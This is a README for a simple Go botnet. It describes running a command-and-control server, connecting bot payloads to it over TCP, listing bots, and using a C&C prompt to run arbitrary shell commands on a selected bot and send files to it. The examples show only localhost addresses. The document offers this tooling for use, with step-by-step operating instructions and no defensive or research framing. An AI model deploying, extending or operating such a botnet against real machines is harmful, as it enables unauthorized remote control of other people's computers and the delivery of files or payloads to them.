## Go Botnet

Simple botnet written in GO. It features a command and control over cli and a botnet payload that communicates to the C&C over tcp.

# Usage:

Compile from the `botnet/cmd/botnet` directory.

 - Run the C&C:

```bash
botnet -listen
```

This starts up a C&C that listens on default port `9999`.

 - Connect a payload to the C&C:

```bash
botnet -port 9999
```

This will start a botnet payload that connects to the C&C on port `9999`.

- Now that we have a payload connected to our C&C we can run a view commands. You'll see the C&C prompt `<CC:#>`

show all payloads connected to C&C:

```bash
<CC:#> show
```

This will return the payload ids and addresses

```
ID: 0 Address: 127.0.0.1:64635
ID: 1 Address: 127.0.0.1:64634
```

- To communicate with the payload use the `use` command followed by the payloads id:

```bash
<CC:#> use 0
```

You will notice now your prompt is changed to `<PL:#>`

- Execute a command in the remote server just type in a command:

```bash
<PL:#> ls -l
```

This will return the directory where the payload is running

- Send a file to the payload:

```bash
<PL:#> u: /path/to/file
```

This will send the specified file to the payload

- Exit out of the payload and go back to the main C&C

```bash
<PL:#> exit
```

You should see a message saying `payload exiting` and the prompt should be back to `<CC#>`
